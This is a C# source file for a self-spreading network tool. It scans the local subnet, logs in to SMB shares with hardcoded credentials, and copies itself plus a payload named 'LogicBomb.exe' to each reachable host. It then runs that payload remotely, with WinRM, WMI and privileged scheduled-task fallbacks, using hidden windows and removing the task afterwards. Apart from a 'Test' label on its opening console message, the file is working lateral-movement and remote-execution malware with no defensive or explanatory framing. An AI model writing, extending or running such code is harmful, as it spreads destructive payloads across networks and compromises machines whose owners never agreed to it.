using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string EXECUTABLE_TO_RUN = "LogicBomb.exe";

    static async Task Main()
    {
        Console.WriteLine("Starting IP Range, SMB Scan, Self-Deployment, and Remote Execution Test...");
        Console.WriteLine("-----------------------------------");

        string localIP = GetLocalIPAddress();
        if (localIP == null)
        {
            Console.WriteLine("[ERROR] Could not detect local IP address.");
            return;
        }

        string baseIP = string.Join(".", localIP.Split('.').Take(3));
        Console.WriteLine($"Local IP Address detected: {localIP}");
        Console.WriteLine($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");

        List<string> smbHosts = await FindSmbServersAsync(baseIP);

        if (smbHosts.Count == 0)
        {
            Console.WriteLine("[INFO] No SMB servers found. Exiting.");
            return;
        }

        Console.WriteLine($"[INFO] Found {smbHosts.Count} SMB host(s) with accessible shares.");

        string tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
        Console.WriteLine($"Preparing deployment package in temporary folder: {tempFolder}");
        PrepareDeploymentPackage(tempFolder);

        foreach (string ip in smbHosts)
        {
            string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
            Console.WriteLine($"Attempting SMB login on {remoteShareUNC}...");

            int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
            if (smbConnectResult == 0)
            {
                Console.WriteLine($"[SMB SUCCESS] Connected to {ip}. Copying deployment files...");
                await CopyFolderAsync(tempFolder, remoteShareUNC);
                Console.WriteLine($"[COPY OK] Files copied to {remoteShareUNC}");

                Console.WriteLine($"[REMOTE EXEC] Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip}...");

                string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";

                bool executionSuccess = ExecuteRemoteCommand(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);

                if (executionSuccess)
                {
                    Console.WriteLine($"[REMOTE EXEC SUCCESS] '{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
                }
                else
                {
                    Console.WriteLine($"[REMOTE EXEC FAILED] Could not execute '{EXECUTABLE_TO_RUN}' on {ip}. Ensure PowerShell Remoting is enabled and credentials are correct.");
                }

                DisconnectFromRemoteShare(remoteShareUNC);
            }
            else
            {
                Console.WriteLine($"[SMB FAILED] {ip} - Error Code: {smbConnectResult}");
            }
        }

        Console.WriteLine("-----------------------------------");
        Console.WriteLine("Scan, deployment, and remote execution complete.");
        Console.WriteLine($"[CLEANUP] Deleting temporary directory: {tempFolder}");
        Directory.Delete(tempFolder, true);

        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var pingTasks = new List<Task>();

        var semaphore = new SemaphoreSlim(50);
        for (int i = 1; i <= 254; i++)
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();

            pingTasks.Add(Task.Run(async () =>
            {
                try
                {
                    var ping = new Ping();
                    var reply = await ping.SendPingAsync(ip, 300);
                    if (reply.Status == IPStatus.Success)
                    {
                        string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                        int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
                        if (result == 0)
                        {
                            Console.WriteLine($"[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
                            lock (activeHosts)
                            {
                                activeHosts.Add(ip);
                            }
                            DisconnectFromRemoteShare(smbPath);
                        }
                        else
                        {
                            Console.WriteLine($"[ACTIVE] {ip} - No SMB share or invalid credentials");
                        }
                    }
                }
                catch (PingException) { }
                catch (Exception ex) { Console.WriteLine($"[ERROR] {ip} - {ex.Message}"); }
                finally { semaphore.Release(); }
            }));
        }

        await Task.WhenAll(pingTasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        Directory.CreateDirectory(tempFolder);

        string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);

        string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);
        if (Directory.Exists(payloadFolder))
        {
            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
        }
        else
        {
            Console.WriteLine($"WARNING: '{PAYLOAD_FOLDER_NAME}' folder not found, skipping copy. Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
        }

        Console.WriteLine("Deployment package prepared successfully.");
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);

        foreach (string dir in Directory.GetDirectories(source))
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            await Task.Run(() => File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));

        foreach (string dir in Directory.GetDirectories(source))
            await CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static string GetLocalIPAddress()
    {
        var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
        return host.AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
    }

    private static bool ExecuteRemoteCommand(string remoteIp, string username, string password, string commandToExecute)
    {
        // Helper to run a local process and capture output
        (int ExitCode, string StdOut, string StdErr) RunProcess(string fileName, string args, int timeoutMs = 20000)
        {
            using (var p = new Process())
            {
                p.StartInfo.FileName = fileName;
                p.StartInfo.Arguments = args;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;

                try
                {
                    p.Start();
                }
                catch (Exception exStart)
                {
                    return (-1, "", $"Failed to start {fileName}: {exStart.Message}");
                }

                string outStr = p.StandardOutput.ReadToEnd();
                string errStr = p.StandardError.ReadToEnd();
                if (!p.WaitForExit(timeoutMs))
                {
                    try { p.Kill(); } catch { }
                    return (-2, outStr, errStr + " (timeout)");
                }
                return (p.ExitCode, outStr, errStr);
            }
        }

        Console.WriteLine($"[EXEC] Attempting remote execution on {remoteIp} using provided credentials...");

        // --- Method A: PowerShell Invoke-Command (WinRM) ---
        try
        {
            string psCommand = $"Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ Start-Process -FilePath '{commandToExecute}' -WindowStyle Hidden }} -ErrorAction Stop";
            string args = $"-NoProfile -NonInteractive -Command \"{psCommand}\"";
            Console.WriteLine("[EXEC-A] Trying PowerShell Invoke-Command (WinRM)...");
            var res = RunProcess("powershell.exe", args, 15000);
            Console.WriteLine($"[EXEC-A] Exit {res.ExitCode}. Out: {res.StdOut}. Err: {res.StdErr}");
            if (res.ExitCode == 0)
            {
                Console.WriteLine("[EXEC-A] Remote execution via WinRM reported success.");
                return true;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[EXEC-A] Exception: " + ex.Message);
        }

        // --- Method B: WMI (Win32_Process.Create) ---
        try
        {
            Console.WriteLine("[EXEC-B] Trying WMI (Win32_Process.Create) via System.Management...");
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = username,
                Password = password,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                EnablePrivileges = true,
                Authority = null
            };

            string path = $"\\\\{remoteIp}\\root\\cimv2";
            var scope = new ManagementScope(path, connOpts);
            scope.Connect(); // may throw

            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
            {
                var inParams = processClass.GetMethodParameters("Create");
                // If commandToExecute has spaces, wrap it as needed
                inParams["CommandLine"] = commandToExecute;
                var outParams = processClass.InvokeMethod("Create", inParams, null);
                if (outParams != null)
                {
                    var returnCode = Convert.ToInt32(outParams["returnValue"]);
                    var newPid = outParams["processId"] != null ? outParams["processId"].ToString() : "(none)";
                    Console.WriteLine($"[EXEC-B] WMI Create returned {returnCode}, pid={newPid}");
                    if (returnCode == 0 || returnCode == 2) // 0 success; 2 sometimes "access denied" variants vary by environment
                        return true;
                }
            }
        }
        catch (Exception exWmi)
        {
            Console.WriteLine("[EXEC-B] WMI failed: " + exWmi.Message);
        }

        // --- Method C: remote Scheduled Task (schtasks) fallback ---
        try
        {
            Console.WriteLine("[EXEC-C] Trying remote scheduled task via schtasks...");
            string taskName = "RemoteRun_" + Guid.NewGuid().ToString("N");
            // Ensure command path is quoted
            string quotedCmd = $"\"{commandToExecute}\"";
            // Create the task (runs once at a dummy time but we'll force run immediately)
            string createArgs = $"/C schtasks /Create /S {remoteIp} /U {username} /P {password} /SC ONCE /ST 00:00 /TN \"{taskName}\" /TR {quotedCmd} /RL HIGHEST /F";
            var createRes = RunProcess("cmd.exe", createArgs, 20000);
            Console.WriteLine($"[EXEC-C] create exit {createRes.ExitCode}. Out: {createRes.StdOut}. Err: {createRes.StdErr}");

            if (createRes.ExitCode == 0 || createRes.StdOut?.ToLower().Contains("success") == true)
            {
                // Run the task
                string runArgs = $"/C schtasks /Run /S {remoteIp} /U {username} /P {password} /TN \"{taskName}\"";
                var runRes = RunProcess("cmd.exe", runArgs, 15000);
                Console.WriteLine($"[EXEC-C] run exit {runRes.ExitCode}. Out: {runRes.StdOut}. Err: {runRes.StdErr}");
                if (runRes.ExitCode == 0 || runRes.StdOut?.ToLower().Contains("successfully") == true)
                {
                    Console.WriteLine("[EXEC-C] Scheduled task launched successfully.");
                    // Optionally delete the task
                    string delArgs = $"/C schtasks /Delete /S {remoteIp} /U {username} /P {password} /TN \"{taskName}\" /F";
                    var delRes = RunProcess("cmd.exe", delArgs, 10000);
                    Console.WriteLine($"[EXEC-C] cleanup exit {delRes.ExitCode}.");
                    return true;
                }
            }
            else
            {
                Console.WriteLine("[EXEC-C] Could not create scheduled task on remote host.");
            }
        }
        catch (Exception exSch)
        {
            Console.WriteLine("[EXEC-C] Exception: " + exSch.Message);
        }

        Console.WriteLine("[EXEC] All remote execution attempts failed. See logs above for details.");
        return false;
    }

    [DllImport("mpr.dll")]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll")]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE
        {
            dwType = 1,
            lpRemoteName = remotePath
        };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        WNetCancelConnection2(remotePath, 0, true);
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string lpLocalName;
        public string lpRemoteName;
        public string lpComment;
        public string lpProvider;
    }
}